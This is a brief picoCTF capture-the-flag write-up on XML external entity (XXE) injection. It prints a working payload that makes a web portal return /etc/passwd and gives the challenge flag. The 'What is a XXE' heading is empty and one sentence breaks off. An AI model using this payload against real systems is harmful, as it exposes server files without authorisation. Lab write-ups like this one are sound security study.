#xxe #XXE 
##### Challenge Description

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:61991/)

## What is a XXE ?


#### Understanding 

I went in the Debugger tab then I tried to understand what was happening in there. 

And After reading the code file, I understood that each time I click on details, it fetches the details thanks to xml so I needed to do an XXE

![](../../PicoCTF-assets/Pasted%20image%2020260308235805.png)

Then after refreshing the 




![](../../PicoCTF-assets/Pasted%20image%2020260308233622.png)


According to the challenge description I need to find the flag in /etc/passwd :

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><ID>&xxe;</ID></data>
```


![](../../PicoCTF-assets/Pasted%20image%2020260308235239.png)

Flag : picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}